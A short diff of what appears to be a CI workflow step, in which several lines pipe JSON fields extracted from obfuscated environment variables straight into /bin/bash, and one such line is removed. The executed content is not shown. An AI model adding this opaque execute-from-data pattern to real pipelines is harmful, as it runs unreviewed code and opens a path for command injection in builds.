@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$df3" | jq -r .ekfig34955 | /bin/bash
           echo $haihh87 | jq -r .azua106 | /bin/bash
           echo $g0774 | jq -r .ujbw3027 | /bin/bash
-          printf '%s' "$cywoh2" | jq -r .jb3 | /bin/bash
           printf '%s' "$qaw906" | jq -r .azeqk7009 | /bin/bash
 
       - name: Save results
